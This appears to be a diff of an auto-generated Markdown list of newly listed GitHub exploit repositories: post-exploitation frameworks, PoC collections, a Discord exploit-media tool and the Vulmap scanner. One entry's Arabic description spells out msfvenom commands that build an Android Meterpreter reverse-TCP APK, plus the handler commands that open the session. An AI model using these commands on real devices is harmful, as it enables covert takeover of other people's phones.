@@ -53,10 +53,10 @@
 # exploit on Github 推荐
 | ts | title | url | stars | forks| 
 | --- | --- | --- | --- | ---| 
+| 20210111T13:57:15Z | linux post-exploitation framework made by linux user | https://github.com/jm33-m0/emp3r0r | 267 | 44| 
 | 20210111T13:51:37Z | This repository contains exploits created by me against various vulnerabilities | https://github.com/7Ragnarok7/PoC | 1 | 0| 
 | 20210111T13:47:34Z | This repository contains exploits created by me against various vulnerabilities | https://github.com/7Ragnarok7/Exploits | 1 | 0| 
 | 20210111T13:43:43Z | Null | https://github.com/1N53C/ExploitDBSearch | 0 | 0| 
-| 20210111T13:24:36Z | linux post-exploitation framework made by linux user | https://github.com/jm33-m0/emp3r0r | 266 | 44| 
 | 20210111T12:57:34Z | a tool for creating exploited media files for discord | https://github.com/Schmenn/discord-exploits | 4 | 0| 
 | 20210111T12:52:23Z | اختراق جميع هواتف اندرويد داخل الشبكة بستخدام #كالي لينوكس امر انشاء بايلود. msfvenom -p android/meterpreter/reverse_tcp lhost=192..........  lport=4444 -o /home/kali/Desktop/app.apk =====================================اوامر فتح الجلسة. use multi/handler set payload android/meterpreter/reverse_tcp  set lhost خاص بك set lport خاص بك exploit | https://github.com/nyctophile6/- | 0 | 0| 
 | 20210111T12:22:36Z | Vulmap - Web vulnerability scanning and verification tools，支持扫描 activemq, flink, shiro, solr, struts2, tomcat, unomi, drupal, elasticsearch, nexus, weblogic, jboss, thinkphp，并且具备漏洞利用功能。CVE-2020-14882, CVE-2020-2555, CVE-2020-2883, S2-061, CVE-2020-13942, CVE-2020-17530, CVE-2020-17518, CVE-2020-17519 | https://github.com/zhzyker/vulmap | 723 | 126| 
